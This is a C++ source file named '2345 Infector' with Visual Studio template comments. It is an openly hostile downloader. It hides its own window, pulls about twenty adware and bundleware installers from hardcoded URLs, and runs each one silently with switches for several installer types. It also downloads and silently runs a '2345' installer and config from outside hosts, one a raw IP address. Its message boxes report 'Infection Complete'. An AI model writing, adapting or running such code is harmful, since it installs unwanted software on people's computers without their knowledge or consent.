// 2345 Infector.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <windows.h>
#include <winhttp.h>
#include <string>
#pragma comment(lib,"URlmon")
#pragma comment(lib,"URlmon.lib")

using namespace std;

string urls[22] = {
	"http://file.drivergenius.com/DGSetup_Home_BZ.exe",
	"https://cdn-file-ssl-pc.ludashi.com/pc/appstore/ludashi/ludashisetup2020.exe",
	"https://dl.360safe.com/se/360se_setup.exe",
	"https://dl.softmgr.qq.com/original/Browser/DCBrowser_4.0.7.22.exe",
	"https://dl.softmgr.qq.com/original/Browser/KSbrowser_p_wwzh_1_2020090701_6.5.115.19871.exe",
	"https://sm.myapp.com/original/Browser/QQBrowser_Setup_9.7.13332.400.exe",
	"https://dl.softmgr.qq.com/original/Browser/115pc_23.9.3.2.exe",
	"https://dl.softmgr.qq.com/original/Browser/KSbrowser_p_wwzh_1_2020090701_6.5.115.19871.exe",
	"https://dl.softmgr.qq.com/original/Browser/sogou_explorer_10.0.2.33514_qm1019.exe",
	"https://sm.myapp.com/original/Input/DucklingWB_33_v3.3.0.0.exe",
	"https://sm.myapp.com/original/Input/GoogleJapaneseInput-v1.3.21.111.exe",
	"https://dl.softmgr.qq.com/original/Compression/k52zip_setup-2019.3.1.128.exe",
	"https://sm.myapp.com/original/Compression/SpeedZipSetupV2.1.6.6.exe",
	"https://dl.softmgr.qq.com/original/net_app/QQPhoneManager_990420.5300.exe",
	"https://dl.softmgr.qq.com/original/Compression/starzip_Setup_1_0_1_10_tn_1001.exe",
	"https://sm.myapp.com/original/Compression/mizip_Setup_2_0_10_119.exe",
	"https://dl.softmgr.qq.com/original/Compression/tuya_0.4.1.7z",
	"https://sm.myapp.com/original/Compression/NiuZip_1.0_qd200300131210_setup.exe",
	"https://sm.myapp.com/original/Compression/quickrar_qqguanjia-1.0.1.100.exe",
	"https://dl.softmgr.qq.com/original/System/DriveTheLife_45062_netcard_8.2.12.74.exe",
	"https://dl.softmgr.qq.com/original/System/51msdn_6.20.11.3.exe",
	"https://sm.myapp.com/original/channelpkg/qqpcmgr_v13.5.20525.234_1349_0.exe",
};


DWORD WINAPI MSG_RUNFIRST(LPVOID lpParam) {
	MessageBoxA(NULL, "Infestor is running！", "2345Infestor", MB_OK | MB_ICONINFORMATION);
	return 0;
}

void RTN(){
	keybd_event(VK_RETURN, 0, 0, 0);
	Sleep(50);
	keybd_event(VK_RETURN, 0, 0x0002, 0);
	Sleep(100);
}
void ProC() {
	/*
	Sleep(1000);
	RTN();
	RTN();
	RTN();
	RTN();
	RTN();/**/
}

LPTHREAD_START_ROUTINE WINAPI DPA(string url) {
	string savefname = url.substr(url.find_last_of("/") + 1, url.find_last_of("?") - 1 - url.find_last_of("/"));
	savefname = savefname.insert(0, "C:\\InfestorDirectory\\");
	URLDownloadToFileA(NULL, url.data(), savefname.data(), NULL, NULL);
	string open_fname = "start " + savefname+ "  /S /D=\"C:\\Program Files\\\"";//NullSoft Installation System 
	system(open_fname.data());
	ProC();
	open_fname = "start " + savefname + "  /Q /D=\"C:\\Program Files\\\"";
	system(open_fname.data());
	ProC();
	open_fname = "start " + savefname + "  /QN REBOOT=SUPPRESS /D=\"C:\\Program Files\\\""; //Microsoft Windows Installer
	system(open_fname.data());
	ProC();
	open_fname = "start " + savefname + "  /passive /norestart /D=\"C:\\Program Files\\\"";//Windows 补丁包
	system(open_fname.data());
	ProC();
	open_fname = "start " + savefname + "   /s /v \"/qb\" /D=\"C:\\Program Files\\\"";//InstallShield with MSI
	system(open_fname.data());
	ProC();
	open_fname = "start " + savefname + "  /sp- /silent /norestart /D=\"C:\\Program Files\\\""; //Inno Setup
	system(open_fname.data());
	ProC();
	open_fname = "start " + savefname + "  /sp- /verysilent /norestart /D=\"C:\\Program Files\\\""; //Inno Setup - Very Silent
	system(open_fname.data());
	ProC();
	open_fname = "start " + savefname + "  /S /D=\"C:\\Program Files\\\""; //WISE Installer
	system(open_fname.data());
	ProC(); 
	return 0;
}

void DPA2345() {
	URLDownloadToFileA(NULL, "http://sqdownd.rbread05.cn/down/2345yjaz.exe", "C:\\InfestorDirectory\\2345Inst.exe", NULL, NULL);
	URLDownloadToFileA(NULL, "http://39.101.194.181/logs/2345pack.ini", "C:\\InfestorDirectory\\2345pack.ini", NULL, NULL);
	system("START C:\\InfestorDirectory\\2345Inst.exe /S");
}

int main(int argc, char* argv[]) {
	// Self Hidden
	HWND hWnd = GetForegroundWindow();
	ShowWindow(hWnd, SW_HIDE);

	CreateThread(0, 0, MSG_RUNFIRST, 0, 0, 0);
	system("mkdir C:\\InfestorDirectory\\");
	for (int i = 0; i < urls->length(); i++) {
		//DPA(urls[i]);
		CreateThread(0, 0, DPA(urls[i]), 0, 0, 0);
	}
	DPA2345();
	MessageBoxA(0, "Infection Complete!\nExiting With Code 0.", "Information:", MB_OK | MB_ICONINFORMATION);
	system("pause");
}


// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧:
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件